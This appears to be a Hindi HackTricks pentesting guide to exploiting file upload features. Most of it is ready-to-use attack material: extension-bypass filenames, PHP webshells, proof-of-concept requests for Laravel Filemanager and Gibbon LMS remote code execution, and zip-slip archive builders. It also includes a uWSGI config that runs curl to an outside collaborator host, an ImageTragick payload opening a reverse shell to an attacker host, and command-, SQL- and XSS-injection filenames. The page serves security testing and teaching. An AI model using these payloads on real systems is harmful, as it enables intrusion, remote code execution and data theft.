# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

अन्य उपयोगी एक्सटेंशन्स:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8 में काम करना**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन चेक बायपास करें

1. यदि लागू होते हैं, तो **पिछले एक्सटेंशन्स** की **जाँच** करें। साथ ही कुछ **uppercase letters** का उपयोग करके भी परीक्षण करें: _pHp, .pHP5, .PhAr ..._
2. _एक वैध एक्सटेंशन को execution एक्सटेंशन से पहले **जोड़कर जांचें** (पिछले एक्सटेंशन्स का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **विशेष वर्ण** जोड़कर प्रयास करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** वर्णों को **bruteforce** कर सकते हैं। (_ध्यान दें कि आप पहले बताये गए **extensions** का भी उपयोग कर सकते हैं_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के एक्सटेंशन पार्सर को धोखा देकर सुरक्षा को बायपास करने की कोशिश करें, जैसे एक्सटेंशन को **दोहराना** या एक्सटेंशन्स के बीच **जंक** डेटा (**null** bytes) जोड़ना। _बेहतर payload तैयार करने के लिए आप **पिछले एक्सटेंशन्स** का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और लेयर एक्सटेंशन्स** जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **exec extension** को वैध एक्सटेंशन से पहले रखने की कोशिश करें और आशा करें कि सर्वर गलत कॉन्फ़िगर है। (Apache misconfigurations को exploit करने में उपयोगी जहाँ किसी भी चीज़ के साथ extension** _**.php**_**, लेकिन** जरुरी नहीं कि .php पर खत्म हो** कोड execute कर सकती है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करें। इस मामले में, एक colon character ":" को एक प्रतिबंधित एक्सटेंशन के बाद और एक अनुमत एक्सटेंशन से पहले डाला जाएगा। परिणामस्वरूप, सर्वर पर एक **खाली फ़ाइल जो प्रतिबंधित एक्सटेंशन के साथ है** बनाई जा सकती है (उदा. "file.asax:.jpg”). इस फ़ाइल को बाद में अन्य तकनीकों का उपयोग करके संपादित किया जा सकता है जैसे कि इसकी short filename का उपयोग। "**::$data**” पैटर्न का उपयोग गैर-खाली फ़ाइलें बनाने के लिए भी किया जा सकता है। इसलिए, इस पैटर्न के बाद एक डॉट चरित्र जोड़ना आगे की सीमाओं को बायपास करने में भी उपयोगी हो सकता (उदा. "file.asp::$data.”)
8. फ़ाइलनाम की सीमा तोड़ने की कोशिश करें। वैध एक्सटेंशन कट सकता है और malicious PHP बच सकता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

कुछ upload handlers saved filename से trailing dot characters को trim या normalize करते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के 2.9.1 से पहले के वर्शन में, आप extension validation को बायपास कर सकते हैं:

- एक वैध image MIME और magic header का उपयोग करें (उदा., PNG’s `\x89PNG\r\n\x1a\n`)।
- अपलोड की गई फ़ाइल का नाम PHP extension के बाद एक डॉट के साथ रखें, जैसे `shell.php.`।
- सर्वर trailing dot को हटा देता है और `shell.php` को persist कर देता है, जो कि वेब-सेव्ड डायरेक्टरी (डिफ़ॉल्ट public storage जैसे `/storage/files/`) में रखा गया हो तो execute होगा।

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर hit the saved path (typical in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
निवारक उपाय:
- unisharp/laravel-filemanager को ≥ 2.9.1 में अपग्रेड करें।
- सख्त server-side allowlists लागू करें और persisted filename को पुनः सत्यापित करें।
- अपलोड्स को non-executable स्थानों से सर्व करें।

### Content-Type, Magic Number, Compression & Resizing को बायपास करना

- **Content-Type** checks को बायपास करने के लिए **Content-Type** **header** के **value** को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** check को बायपास करने के लिए फ़ाइल की शुरुआत में **एक असली image के bytes** जोड़ें ( _file_ command को भ्रमित करने के लिए)। या shell को **metadata** में डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे image में भी जोड़ सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- अगर आपकी image पर **compression add** की जा रही है, जैसे PHP-GD जैसी standard PHP libraries का उपयोग करके, तो ऊपर की तकनीकें उपयोगी नहीं होंगी। हालाँकि, आप **PLTE chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि ऐसा कुछ text insert किया जा सके जो **compression में टिके**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD functions `imagecopyresized` या `imagecopyresampled` का उपयोग करके। फिर भी, आप **IDAT chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि ऐसा कुछ text insert किया जा सके जो **compression में टिके**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जिससे payload image resizing में **बची रहे**, PHP-GD function `thumbnailImage` का उपयोग करते हुए बनाई जा सकती है। फिर भी, आप **tEXt chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि ऐसा कुछ text insert किया जा सके जो **compression में टिके**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### अन्य जाँच के ट्रिक्स

- पहले से अपलोड की गई फ़ाइल का नाम बदलने (extension बदलने) की vulnerability खोजें।
- backdoor को execute करने के लिए किसी **Local File Inclusion** vulnerability को खोजें।
- **संभव सूचना प्रकटीकरण**:
1. एक ही फ़ाइल को **कई बार** (और **एक ही समय पर**) उसी **नाम** के साथ अपलोड करें।
2. किसी फ़ाइल या फ़ोल्डर के **नाम** के साथ फ़ाइल अपलोड करें जो पहले से मौजूद हो।
3. फ़ाइल का नाम `"." , "..", या "…"` रखें। उदाहरण के लिए, Apache में **Windows** पर, यदि एप्लीकेशन "/www/uploads/" directory में अपलोड फाइलें सेव करती है, तो "." filename "/www/" directory में एक फ़ाइल बनाएगा जिसका नाम uploads” होगा।
4. ऐसी फ़ाइल अपलोड करें जिसे आसानी से delete न किया जा सके, जैसे **"…:.jpg"** in **NTFS**। (Windows)
5. **Windows** में फ़ाइल का नाम invalid characters जैसे `|<>*?”` रखें। (Windows)
6. **Windows** में reserved (forbidden) names जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, और LPT9 का उपयोग करके फ़ाइल अपलोड करने की कोशिश करें।
- यह भी कोशिश करें कि कोई **executable** (.exe) या एक कम शक वाली **.html** फ़ाइल अपलोड करें जो victim द्वारा गलती से खोली जाने पर **code execute** कर दे।

### Special extension tricks

यदि आप **PHP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, तो code execute करने के लिए [**.htaccess** trick देखें](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, तो code execute करने के लिए [**.config** trick देखें](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फाइलें `.jar` की तरह होती हैं (java के लिए), लेकिन php के लिए, और इन्हें **php file** की तरह उपयोग किया जा सकता है (php से execute करना, या किसी script में include करना...)।

`.inc` extension कभी-कभी php फाइलों के लिए उपयोग किया जाता है जो सिर्फ import के लिए होते हैं, इसलिए किसी बिंदु पर किसी ने इस extension को execute करने की अनुमति दी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में कोई XML फ़ाइल अपलोड कर पाते हैं तो आप [RCE प्राप्त कर सकते हैं क्योंकि **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**।** जैसा कि नीचे की image में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में अपलोड करें और shell की उम्मीद रखें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत पड़ताल के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities उन uWSGI servers में exploit की जा सकती हैं यदि किसी के पास `.ini` configuration file modify करने की क्षमता हो। uWSGI configuration files एक विशेष syntax का उपयोग करते हैं जो "magic" variables, placeholders, और operators को शामिल करते हैं। विशेष रूप से, '@' operator, जिसे `@(filename)` के रूप में उपयोग किया जाता है, किसी फ़ाइल की सामग्री को include करने के लिए design किया गया है। uWSGI में समर्थित विभिन्न schemes के बीच, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से data पढ़ने की अनुमति देता है। इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read के लिए किया जा सकता है जब कोई `.ini` configuration file process की जाती है।

नीचे एक हानिकारक `uwsgi.ini` फ़ाइल का उदाहरण देखें, जो विभिन्न schemes दिखाती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना महत्वपूर्ण है कि uWSGI के configuration file के parsing की प्रकृति काफी ढीली है। विशेष रूप से, चर्चा किए गए payload को एक binary file (जैसे image या PDF) में सम्मिलित किया जा सकता है, जिससे संभावित exploitation का दायरा और बढ़ जाता है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS में एक unauthenticated endpoint web root के अंदर arbitrary file write की अनुमति देता है, जिससे PHP फ़ाइल डालकर pre-auth RCE संभव हो जाता है। प्रभावित संस्करण: 25.0.01 तक (समेत)।

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक न्यूनतम webshell डालकर commands निष्पादित करें:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
नोट्स:
- हैंडलर `;` और `,` से विभाजन करने के बाद `base64_decode($_POST["img"])` اجرا करता है, फिर एक्सटेंशन/टाइप की जाँच किए बिना बाइट्स को `$absolutePath . '/' . $_POST['path']` में लिखता है।
- परिणामी कोड वेब सर्विस यूज़र के रूप में चलता है (उदा., XAMPP Apache on Windows).

इस बग के संदर्भों में usd HeroLab advisory और NVD entry शामिल हैं। नीचे References सेक्शन देखें।

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप देख सकते हैं कि सर्वर **`wget`** का उपयोग करके **download files** कर रहा है और आप **URL** निर्दिष्ट कर सकते हैं। ऐसे मामलों में, कोड यह जाँच कर सकता है कि डाउनलोड की गई फ़ाइलों का extension whitelist में है ताकि केवल अनुमत फाइलें ही डाउनलोड हों। हालांकि, **this check can be bypassed.**\
लिनक्स में किसी **filename** की अधिकतम लंबाई **255** है, हालांकि **wget** फ़ाइलनामों को **236** कैरेक्टर तक truncate कर देता है। आप **download a file called "A"*232+".php"+".gif"**, यह फ़ाइलनाम **bypass** कर देगा **check** को (इस उदाहरण में **".gif"** एक **valid** extension है) पर `wget` उस फ़ाइल का नाम बदलकर **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **एक और विकल्प** आप सोच रहे होंगे इस जांच को बायपास करने के लिए वह है कि **HTTP server redirect to a different file**, ताकि initial URL जांच को बायपास कर ले और फिर wget redirected file को नए नाम के साथ डाउनलोड कर ले। यह **काम नहीं करेगा** **जबतक** wget `--trust-server-names` **parameter** के साथ उपयोग नहीं किया जा रहा है क्योंकि **wget redirected page को original URL में दिखाए गए फ़ाइल के नाम के साथ ही डाउनलोड करेगा**।

### NTFS junctions (Windows) के जरिए अपलोड निर्देशिका से बाहर निकलना

(इस attack के लिए आपको Windows मशीन पर local access चाहिए होगा) जब uploads Windows में per-user subfolders के तहत स्टोर होते हैं (e.g., C:\Windows\Tasks\Uploads\<id>\) और आप उस subfolder के creation/deletion को नियंत्रित करते हैं, तो आप इसे एक directory junction से बदल सकते हैं जो किसी sensitive location (e.g., the webroot) की ओर पॉइंट करे। बाद की uploads target path में लिखी जाएंगी, जिससे code execution संभव हो जाएगा अगर target server‑side code को interpret करता है।

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
नोट्स
- mklink /J NTFS directory junction (reparse point) बनाता है। वेब सर्वर का अकाउंट junction को follow कर सके और destination में write permission होना चाहिए।
- यह arbitrary file writes को redirect करता है; यदि destination scripts (PHP/ASP) execute करता है, तो यह RCE बन सकता है।
- Defenses: writable upload roots को attacker‑controllable होने न दें खासकर C:\Windows\Tasks या समान स्थानों में; junction creation को block करें; extensions को server‑side validate करें; uploads को अलग volume पर रखें या deny‑execute ACLs लगाएँ।

## टूल्स

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली tool है जो Pentesters और Bug Hunters को file upload mechanisms की टेस्टिंग में मदद करता है। यह विभिन्न bug bounty techniques का उपयोग करके web applications की vulnerabilities पहचानने और exploit करने की प्रक्रिया को सरल बनाता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या समान functions का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` structureforge करने के लिए trick किया जा सकता है। `snprintf()` के inconsistent behavior और truncation के कारण, सावधानीपूर्वक-crafted single upload सर्वर साइड पर multiple indexed files जैसा दिख सकता है, जिससे logic जो strict shape मानता है (उदा., इसे multi-file upload समझकर unsafe branches लेना) भ्रमित हो सकती है। आज यह पैटर्न niche है, पर CTFs और पुराने codebases में कभी-कभी यह फिर उभरता है।

## File upload से अन्य कमजोरियाँ

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- अगर आप वेब सर्वर को किसी URL से image fetch करने के लिए कह सकते हैं तो आप एक SSRF का दुर्व्यवहार आज़मा सकते हैं। अगर यह image किसी public site पर saved होने वाली है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) जैसा URL भी इंगित कर सकते हैं और हर visitor की जानकारी चोरी कर सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- विशेष रूप से crafted PDFs से XSS: [नीचे पृष्ठ बताता है कि कैसे **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md)। अगर आप PDFs upload कर सकते हैं तो आप ऐसा PDF तैयार कर सकते हैं जो दिए गए निर्देशों के अनुसार arbitrary JS execute कराए।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

यहाँ एक top 10 सूची है जो आप upload करके हासिल कर सकते हैं (source: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## मैजिक हैडर बाइट्स

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए देखें: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Zip/Tar File Automatically decompressed Upload

अगर आप ऐसा ZIP upload कर सकते हैं जिसे server के अंदर decompress किया जाएगा, तो आप दो चीजें कर सकते हैं:

### Symlink

एक link upload करें जिसमें अन्य files के soft links हों, फिर decompressed files को access करके आप linked files को access कर पाएँगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### अलग फ़ोल्डरों में डीकम्प्रेस

Decompression के दौरान डायरेक्टरी में अनपेक्षित फ़ाइलों का बनना एक गंभीर समस्या है। शुरुआती अनुमान के बावजूद कि यह सेटअप malicious file uploads के जरिए OS-level command execution से बचाव करेगा, ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे attackers प्रतिबंधों को बायपास कर secure upload directories से निकल सकते हैं, बस target application की decompression functionality को manipulate करके।

An automated exploit इन फ़ाइलों को बनाने के लिए [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। इस utility का उपयोग इस तरह किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी किसी फ़ाइल को लक्षित करना है, तो आपके सिस्टम में उस फ़ाइल के लिए एक symlink बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc अपने संचालन के दौरान त्रुटियों का सामना न करे।

नीचे एक उदाहरण Python कोड दिया गया है जो एक दुष्ट zip फ़ाइल बनाने के लिए उपयोग किया गया है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**कम्प्रेशन का दुरुपयोग करके file spraying**

अधिक विवरण के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell बनाना**: PHP कोड लिखा गया है जो `$_REQUEST` वैरिएबल के द्वारा भेजे गए commands को execute करता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying और कम्प्रेस्ड फाइल बनाना**: कई फाइलें बनाई जाती हैं और इन फाइलों को शामिल करते हुए एक zip आर्काइव तैयार किया जाता है।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor या vi के साथ संशोधन**: zip के अंदर फाइलों के नाम vi या hex editor का उपयोग करके बदले जाते हैं, "xxA" को "../" में बदलकर directory traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

इस कंटेंट को image extension के साथ अपलोड करके यह vulnerability exploit करें **(ImageMagick , 7.0.1-1)** (देखें: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

PNG फ़ाइल के IDAT chunk में एक PHP shell एम्बेड करने से कुछ image processing ऑपरेशनों को प्रभावी रूप से बायपास किया जा सकता है। PHP-GD के फ़ंक्शन्स `imagecopyresized` और `imagecopyresampled` इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि इन्हें आम तौर पर इमेज को रीसाइज़ और रीसैंपल करने के लिए उपयोग किया जाता है। एम्बेडेड PHP shell का इन ऑपरेशनों से अप्रभावित रहना कुछ उपयोग मामलों के लिए एक महत्वपूर्ण लाभ है।

A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबर सुरक्षा में एक अनूठा उपकरण हैं, जो कैमेलियन की तरह काम करते हैं और एक साथ कई file formats में वैध रूप से मौजूद हो सकते हैं। एक रोचक उदाहरण है एक [GIFAR](https://en.wikipedia.org/wiki/Gifar), जो एक हाइब्रिड है और एक ही समय में GIF और RAR archive के रूप में कार्य करता है। ऐसे फ़ाइलें केवल इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी संयोजन भी संभव हैं।

